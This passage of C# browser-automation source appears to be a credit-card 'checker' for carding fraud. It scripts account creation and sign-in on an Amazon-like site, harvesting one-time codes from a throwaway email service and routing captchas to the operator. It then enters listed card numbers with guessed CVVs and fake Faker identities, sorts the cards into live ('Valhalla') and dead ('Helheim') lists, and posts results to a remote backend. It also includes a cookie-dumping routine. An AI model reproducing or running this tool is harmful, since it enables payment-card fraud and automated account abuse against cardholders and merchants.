                //string clickEmail = "document.querySelector('#table_dea_messages > tbody > tr:nth-child(1) > td:nth-child(1) > div.first_td > div.from.inline > strong').click();";
                //await browser2.ExecuteScript(clickEmail);
            }
            catch (Exception) { }

            bool iframeMessage = await browser2.ElementVisible("#read > div.body > iframe", "ExceptionCheckEmail");
            if (iframeMessage)
            {
                frame = await browser2.GetFrameByName("<!--framePath //<!--frame0-->-->");
                bool paragraphOTP = await frame.FrameElementVisible("#verificationMsg > p.otp");

                if (paragraphOTP)
                {
                    return await GetOTP();
                }
            }
            await ConsoleProgressGeneral("Requisando donaciones del alumnado. ¡Fallo!", 30, "Fail");
            return false;
        }

        private async Task<bool> GetOTP()
        {
            try
            {
                browser2.Screenshot("4.GetOTP");
                await ConsoleProgressGeneral("Saborizando segundos platos.", 35);
                string getOTP = "document.querySelector('#verificationMsg > p.otp').textContent;";
                object otp = await frame.FExecuteScript(getOTP);
                if (otp != null)
                {
                    EmailOTP = otp.ToString();
                    return true;
                }

            }
            catch (Exception) { }
            await ConsoleProgressGeneral("Saborizando segundos platos.¡Fallo! ", 35, "Fail");
            return false;
        }

        private async Task<bool> Captcha()
        {
            try
            {
                ////browser.Screenshot("4.Captcha");
                await ConsoleProgressGeneral("Concienciando de que \"somos una piña\".", 40);
                string imageAtrributeSource = "document.querySelector('img[alt=captcha]').getAttribute('src');";
                string source = (string)await browser.ExecuteScript(imageAtrributeSource);

                if (source != null)
                {
                    var request = WebRequest.Create(source);

                    using (WebResponse response = request.GetResponse())
                    using (Stream stream = response.GetResponseStream())
                    {
                        PictureBoxCaptcha.Image = Bitmap.FromStream(stream);
                    }

                    if (!PanelCaptcha.Visible)
                    {
                        PanelCaptcha.Show();
                    }
                    TextBoxCaptcha.Text = string.Empty;
                    await IconButtonCaptcha.OnClickAsync();
                    textCaptchaResolve = TextBoxCaptcha.Text;
                    await ResolveCaptcha();

                }
            }
            catch (Exception) { }

            bool inputCode = await browser.ElementVisible("input[name=code]", "ExceptionCaptcha");
            if (inputCode)
            {

                PanelCaptcha.Hide();
                TextBoxCaptcha.Text = string.Empty;
                return await RefreshEmail();
            }
            else
            {
                bool iconAlert = await browser.ElementVisible("div.a-box-inner.a-alert-container > i.a-icon.a-icon-alert", "ExceptionCaptchaIconAlert");
                if (iconAlert)
                {
                    return await Captcha();
                }
            }
            await ConsoleProgressGeneral("Concienciando de que \"somos una piña\". ¡Fallo! ", 40, "Fail");
            return false;
        }

        private async Task ResolveCaptcha()
        {
            try
            {
                ////browser.Screenshot("5.resolveCaptcha");
                await ConsoleProgressGeneral("Prediciendo prevalencia de los charcos.", 45);
                await browser.SendKeys("input[name=cvf_captcha_input]", textCaptchaResolve);
                await browser.Click("input[name=cvf_captcha_captcha_action]");
            }
            catch (Exception) { }
        }


        private async Task<bool> SetOTP()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("6.SetOTP");
                    await ConsoleProgressGeneral("Iniciando intrigas viles.", 50);
                    await browser.SendKeys("input[name=code]", EmailOTP);
                    await browser.Click("#a-autoid-0");
                }
                catch (Exception) { }

                bool inputPhone = await browser.ElementVisible("input[name=cvf_phone_num]", "ExceptionSetOTP");
                if (inputPhone)
                {
                    Task.Run(() => browser2.Kill("www.mohmal.com"));
                    return await Phone();
                }
                await ConsoleProgressGeneral("Iniciando intrigas viles. ¡Fallo!", 50, "Fail");
                return false;
            }
            else { return false; }
        }

        private async Task<bool> ChangeEmail()
        {
            try
            {
                ////browser.Screenshot("7.ChangeEmail");
                await ConsoleProgressGeneral("Escribiendo textos del arranque.", 55);
                await browser.Click("a.a-link-normal.cvf-widget-link-claim-change");
            }
            catch (Exception) { }

            bool inputCustomerName = await browser.ElementVisible("#ap_customer_name", "ExceptionChange");
            if (inputCustomerName)
            {
                return await CreateAccount();
            }
            await ConsoleProgressGeneral("Escribiendo textos del arranque. ¡Fallo!", 55, "Fail");
            return false;

        }

        private async Task<bool> Phone()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("8.Phone");
                    await ConsoleProgressGeneral("Preparando pitos y flautas.", 60);
                    PanelPhone.Show();
                    await IconButtonPhone.OnClickAsync();
                    var nativePhone = TextBoxNativePhone.Text;
                    var phone = TextBoxPhone.Text;
                    string selected = @"let select = document.getElementById('cvf_phone_cc_native');
                    let lenght = select.options.length;
                    for (var i = 0; i < lenght; i++)
                    {
                        var option = select.options[i];
                        if (option.text.includes('+" + nativePhone + @"'))
                        {
                            select.options[i].setAttribute('selected','selected');
                            break;
                        }
                    }";
                    await browser.ExecuteScript(selected);

                    await browser.SendKeys("input[name=cvf_phone_num]", phone);
                    await browser.Click("#a-autoid-0 > span > input");

                }
                catch (Exception) { }

                bool inputCode = await browser.ElementVisible("input[name=code]", "ExceptionPhone");
                if (inputCode)
                {
                    PanelPhone.Hide();
                    TextBoxNativePhone.Text = string.Empty;
                    TextBoxPhone.Text = string.Empty;
                    return await PhoneOTP();
                }
                await ConsoleProgressGeneral("Preparando pitos y flautas. ¡Fallo!", 60, "Fail");
                return false;
            }
            else { return false; }
        }

        private async Task<bool> PhoneOTP()
        {
            try
            {
                ////browser.Screenshot("10.PhoneOTP");
                await ConsoleProgressGeneral("Generando Algoritmo de cotorreo.", 65);
                PanelOTP.Show();
                await IconButtonOTP.OnClickAsync();
                string phoneOTP = TextBoxOTP.Text;
                await browser.SendKeys("input[name=code]", phoneOTP);

                await browser.Click("input[name=cvf_action]");
            }
            catch (Exception) { /*throw;*/ }
            PanelOTP.Hide();
            TextBoxOTP.Text = string.Empty;


            bool inputPasword = await browser.ElementVisible("#ap_password", "ExceptionPhoneOTPInputPassword");
            if (inputPasword)
            {
                return await SignIn();
            }
            bool inputAccountHolderName = await browser.ElementVisible("input[name=ppw-accountHolderName]", "ExceptionPhoneOTP");
            if (inputAccountHolderName)
            {
                ////browser.Screenshot("11.Algo");
                //return true;
            }
            else
            {
                bool inputCode = await browser.ElementVisible("input[name=code]", "ExceptionPhoneOTPInputCode");
                if (inputCode)
                {
                    return await PhoneOTP();
                }
                else
                {
                    bool inputPhone = await browser.ElementVisible("input[name=cvf_phone_num]", "ExceptionPhoneOTPInputPhone");
                    if (inputPhone)
                    {
                        return await Phone();
                    }
                }
            }
            await ConsoleProgressGeneral("Generando Algoritmo de cotorreo. ¡Fallo!", 65, "Fail");
            return false;
        }

        private async Task<bool> SignIn()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("11.SignIn");
                    await ConsoleProgressGeneral("Incremento de las conductas laborales.", 70);
                    await browser.SendKeys("#ap_password", Password);
                    await browser.Click("#signInSubmit");

                    //string selectedPickup = @"let select = document.getElementById('cvf_phone_cc_native');
                    //let items = select.getElementsByTagName('option');
                    //let index = Math.floor(Math.random() * (items.length - 1)) + 1;
                    //select.selectedIndex = index;
                    //if(index == 2)
                    //{
                    //    document.querySelector('#liPickupPerson').setAttribute('style','display: block;');
                    //    document.querySelector('#txtPickupPerson').value = " + $"'{Faker.Name.FullName()}'" + @";
                    //}
                    //document.querySelector('#btnSaveAndContinue').click();";
                    //await browser.ExecuteScript(selectedPickup);
                }
                catch (Exception) { }

                bool imageCaptcha2 = await browser.ElementVisible("#auth-captcha-image", "ExceptionSignIn");

                if (imageCaptcha2)
                {
                    string imageAtrributeSource = "document.querySelector('#auth-captcha-image').getAttribute('src');";
                    string source = (string)await browser.ExecuteScript(imageAtrributeSource);

                    if (source != null)
                    {
                        var request = WebRequest.Create(source);

                        using (WebResponse response = request.GetResponse())
                        using (Stream stream = response.GetResponseStream())
                        {
                            PictureBoxCaptcha2.Image = Bitmap.FromStream(stream);
                        }

                        if (!PanelCaptcha2.Visible)
                        {
                            PanelCaptcha2.Show();
                        }

                        TextBoxCaptcha2.Text = string.Empty;
                        await IconButtonCaptcha2.OnClickAsync();
                        textCaptchaResolve2 = TextBoxCaptcha2.Text;
                        await ResolveCaptcha2();

                    }

                    await Task.Delay(10000);
                    ////browser.Screenshot("16.resolveCaptcha2");
                    await browser.GetSource();
                }
                await ConsoleProgressGeneral("Incremento de las conductas laborales. ¡Fallo!", 70, "Fail");
                return false;
            }
            else { return false; }
        }

        private async Task ResolveCaptcha2()
        {
            try
            {
                ////browser.Screenshot("12.resolveCaptcha2");
                await ConsoleProgressGeneral("Prediciendo prevalencia de los charcos.", 75);
                await browser.SendKeys("#ap_password", Password);
                ////browser.Screenshot("13.resolveCaptcha2");
                await browser.SendKeys("#auth-captcha-guess", textCaptchaResolve2);
                ////browser.Screenshot("14.resolveCaptcha2");
                string clickSignIn ="document.querySelector('#signInSubmit').click();";
                await browser.ExecuteScript(clickSignIn);
            }
            catch (Exception) { }
            ////browser.Screenshot("15.resolveCaptcha2");
        }

        private async Task<bool> Last()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("9.SelectPickup");
                    await ConsoleProgressGeneral("Difundiendo rumores.", 90);
                    string listLiveCreditCard = string.Empty;
                    string listDieCreditCard = string.Empty;
                    if (CreditCards.Count > 0)
                    {
                        LiveCreditCards = new List<List<string>>();
                        DieCreditCards = new List<List<string>>();
                        int creditCardsCount = CreditCards.Count;
                        int x = 0;
                        for (int i = 0; i < creditCardsCount;)
                        {
                            if (running)
                            {
                                await ConsoleProgressDetail("Sintetización de la selección natural.", 0);
                                string number = CreditCards[i][0];
                                string month = int.Parse(CreditCards[i][1]).ToString();
                                string year = (int.Parse(CreditCards[i][2].Substring(CreditCards[i][2].Length - 1, 1)) + 1).ToString();
                                string cvv = string.Empty;
                                if (CreditCards[i][3].Length == 4)
                                {
                                    cvv = "0000";
                                }
                                else
                                {
                                    cvv = "000";
                                }

                                bool latestData = await Card(number, month, year);
                                if (latestData)
                                {
                                    bool forseti = await Forseti();
                                    if (forseti)
                                    {
                                        ////browser.Screenshot(x.ToString() + ".Valhalla_" + number);
                                        await ConsoleProgressDetail(number, 100, "Success");
                                        if (TextBoxValhalla.Text == string.Empty)
                                        {
                                            listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
                                            await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                        }
                                        else
                                        {
                                            listLiveCreditCard = TextBoxValhalla.Text;
                                            listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                                            await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                        }
                                        //await Task.Run(() => checker.LoadPlanDetails());
                                        //await Task.Run(() => home.LoadCountValhalla());
                                        //await Task.Run(() => home.LoadPlanDetails());
                                        //await Task.Run(() => home.LoadValhalla());
                                        ReduceListCreditCards();
                                        TextBoxValhalla.Text = listLiveCreditCard;
                                        double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                                        await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
                                        await Task.Delay(50);
                                        x++;
                                        return false;
                                    }
                                    else
                                    {
                                        if (!forsetiError)
                                        {
                                            ////browser.Screenshot(x.ToString() + ".Helheim_" + number);
                                            await ConsoleProgressDetail(number, 100, "Fail");
                                            if (TextBoxHelheim.Text == string.Empty)
                                            {
                                                listDieCreditCard += string.Join("|", CreditCards[i].ToArray());
                                                await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                            }
                                            else
                                            {
                                                listDieCreditCard = TextBoxHelheim.Text;
                                                listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                                                await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                            }
                                            //await Task.Run(() => home.LoadCountHelheim());
                                            ReduceListCreditCards();
                                            TextBoxHelheim.Text = listDieCreditCard;
                                            double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                                            await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
                                            await Task.Delay(50);
                                            x++;
                                            continue;
                                        }
                                        else
                                        {
                                            forsetiError = true;
                                            return false;
                                        }
                                    }
                                }
                                else { return false; }
                            }
                            else { return false; }
                        }
                    }
                }
                catch (Exception) { }

                if (CreditCards.Count > 0)
                {
                    await ConsoleProgressGeneral("Difundiendo rumores. ¡Fallo!", 90, "Fail");
                    return false;
                }
                else
                {
                    return true;
                }
            }
            else { return false; }
        }
        #endregion

        #region Methods
        private async void ReduceListCreditCards()
        {
            try
            {
                CreditCards.RemoveAt(0);
                string listCreditCard = string.Empty;
                int creditCardsCount = CreditCards.Count;
                for (int y = 0; y < creditCardsCount; y++)
                {
                    if (CreditCards.Count > 0)
                    {
                        if (y < CreditCards.Count - 1)
                        {
                            listCreditCard += string.Join("|", CreditCards[y].ToArray()) + "\r\n";
                        }
                        else
                        {
                            listCreditCard += string.Join("|", CreditCards[y].ToArray());
                        }
                    }
                    else
                    {
                        listCreditCard = string.Empty;
                    }
                    await Task.Delay(100);
                }
                TextBoxCreditCards.Text = listCreditCard;
            }
            catch (Exception) { }
        }

        private async Task<bool> Card(string number, string month, string year)
        {
            if (running)
            {

                try
                {
                    ////browser.Screenshot("10.Last");
                    await ConsoleProgressDetail("Inicializando sociedades secretas.", 20);

                    await browser.SendKeys("input[name=ppw-accountHolderName]", FullName);
                    await browser.SendKeys("input[name=addCreditCardNumber]", number);

                    string selected = @"let select = document.getElementById('cvf_phone_cc_native');
                    let lenght = select.options.length;
                    for (var i = 0; i < lenght; i++)
                    {
                        var option = select.options[i];
                        if (option.text.includes('+" + month + @"'))
                        {
                            select.options[i].setAttribute('selected','selected');
                            break;
                        }
                    }";
                    await browser.ExecuteScript(selected);
                    await Task.Delay(1000);
                    string clickNativePhone = "document.querySelector('#cvf_phone_cc_aui > span > span').click();";
                    await browser.ExecuteScript(clickNativePhone);
                    await Task.Delay(1000);
                    string clickNativePhoneSelected = "document.querySelector('#a-popover-1 > div > div > ul > li[aria-checked=true] > a').click();";
                    await browser.ExecuteScript(clickNativePhoneSelected);

                    string fillPayment = @"document.querySelector('#aspnetForm').reset();
                     document.querySelector('#radPaymentCreditCard').click();" +
                   $"document.querySelector('#txtCreditCardNumber').value = '{number}';" +
                   $"document.querySelector('#ccExpirationMonth').selectedIndex = {month};" +
                   $"document.querySelector('#ccExpirationYear').selectedIndex = {year};" +
                   $"document.querySelector('#txtFirstName').value ='{Faker.Name.FirstName()}';" +
                   $"document.querySelector('#txtLastName').value ='{Faker.Name.LastName()}';" +
                   $"document.querySelector('#txtShippingAddr1').value ='{Faker.Address.StreetAddress()}';" +
                   $"document.querySelector('#txtCity').value ='{Faker.Address.City()}';" +
                   @"let selectState = document.querySelector('#selState');
                            let states = selectState.querySelectorAll('option');
                            let index = Math.floor(Math.random() * (states.length - 1)) + 1;
                            selectState.selectedIndex = index;
                            document.querySelector('#selCountry').selectedIndex = 238;" +
                   $"document.querySelector('#txtZip').value ='{Faker.Address.ZipCode("#####")}';" +
                   $"document.querySelector('#txtPhone').value ='{Faker.Phone.PhoneNumber()}';";


                    await browser.ExecuteScript(fillPayment);
                    await Task.Delay(1000);
                    string buttonSaveContinue = @"document.querySelector('#btnSaveAndContinue').click();";
                    await browser.ExecuteScript(buttonSaveContinue);

                }
                catch (Exception) { }

                bool buttonOk = await browser.ElementVisible("div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input", "ExceptionLastButtonOk");
                if (buttonOk)
                {
                    return true;
                }
                else
                {
                    bool buttonPlaceOrder = await browser.ElementVisible("#btnPlaceOrder", "ExceptionLastButtonPlaceOrder");
                    if (buttonPlaceOrder)
                    {
                        return true;
                    }

                }
                await ConsoleProgressDetail("Inicializando sociedades secretas.", 20, "Fail");
                return false;
            }
            else { return false; }
        }

        private async Task ClickButtonOK()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("12.Forseti");
                    string clickOk = @"document.querySelector('div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
                    await browser.ExecuteScript(clickOk);
                }
                catch (Exception) { }
            }
        }

        private async Task<bool> Forseti()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("11.LatestData");
                    await ConsoleProgressDetail("Insuflando furia subatómica.", 90);

                    bool hellheim = await browser.ElementVisible("div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input", "ExceptionLastButtonOk");
                    if (hellheim)
                    {
                        await ClickButtonOK();
                        return false;
                    }
                    else
                    {
                        bool valhalla = await browser.ElementVisible("#btnPlaceOrder", "ExceptionLastButtonPlaceOrder");
                        if (valhalla)
                        {
                            return true;
                        }

                    }
                }
                catch (Exception) { }
                await ConsoleProgressDetail("Insuflando furia subatómica. ¡Fallo!", 90, "Fail");
                forsetiError = true;
                return false;
            }
            else { return false; }
        }
        #endregion

        #endregion

        private void iconButton1_Click(object sender, EventArgs e)
        {
            var visitor = new CookieMonster(all_cookies =>
            {
                var sb = new StringBuilder();
                foreach (var nameValue in all_cookies)
                    sb.AppendLine(nameValue.Item1 + " = " + nameValue.Item2);
                BeginInvoke(new MethodInvoker(() =>
                {
                    MessageBox.Show(sb.ToString());
                }));
            });

            Cef.GetGlobalCookieManager().VisitAllCookies(visitor);
        }

        private void PanelCaptcha_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxCaptcha = new Rectangle(TextBoxCaptcha.Location.X, TextBoxCaptcha.Location.Y, TextBoxCaptcha.ClientSize.Width, TextBoxCaptcha.ClientSize.Height);
            borderTextBoxCaptcha.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCaptcha, Color.White, ButtonBorderStyle.Solid);
        }

        //private async void IconButtonCaptcha_Click(object sender, EventArgs e)
        //{
        //    if (string.IsNullOrEmpty(TextBoxCaptcha.Text) && TextBoxCaptcha.Text.Length == 6)
        //    {
        //        textCaptchaResolve = TextBoxCaptcha.Text;
        //        await ResolveCaptcha();

        //    }
        //}

        private async void LinkLabelCaptchaRefresh_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                //message
                await browser.Click("a-link-normal.cvf-widget-link-new-captcha.cvf-widget-btn-val.cvf-widget-link-disable-target.captcha_refresh_link");
            }
            catch (Exception) { }

            bool imageCaptcha = await browser.ElementVisible("img[alt=captcha]", "ExceptionCreateAccount");
            if (imageCaptcha)
            {
                await Captcha();
            }

        }

        private void PanelPhone_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxNativePhone = new Rectangle(TextBoxNativePhone.Location.X, TextBoxNativePhone.Location.Y, TextBoxNativePhone.ClientSize.Width, TextBoxNativePhone.ClientSize.Height);
            borderTextBoxNativePhone.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxNativePhone, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxPhone = new Rectangle(TextBoxPhone.Location.X, TextBoxPhone.Location.Y, TextBoxPhone.ClientSize.Width, TextBoxPhone.ClientSize.Height);
            borderTextBoxPhone.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxPhone, Color.White, ButtonBorderStyle.Solid);
        }

        private void PanelOTP_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxOTP = new Rectangle(TextBoxOTP.Location.X, TextBoxOTP.Location.Y, TextBoxOTP.ClientSize.Width, TextBoxOTP.ClientSize.Height);
            borderTextBoxOTP.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxOTP, Color.White, ButtonBorderStyle.Solid);
        }


    }


}
